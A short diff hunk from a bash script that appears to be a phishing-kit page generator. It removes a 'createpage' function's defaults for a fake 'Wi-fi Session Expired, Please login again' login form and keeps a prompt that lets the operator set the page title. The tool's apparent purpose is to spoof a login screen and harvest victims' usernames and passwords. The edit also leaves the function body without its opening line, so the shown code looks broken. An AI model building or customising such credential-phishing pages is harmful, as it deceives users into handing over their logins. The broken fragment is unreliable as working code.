@@ -121,12 +121,6 @@ rm -rf sendlink
 fi
 
 
-createpage() {
-default_cap1="Wi-fi Session Expired"
-default_cap2="Please login again."
-default_user_text="Username:12345678"
-default_pass_text="Password:12345678"
-default_sub_text="Log-In"
 
 read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
 cap1="${cap1:-${default_cap1}}"
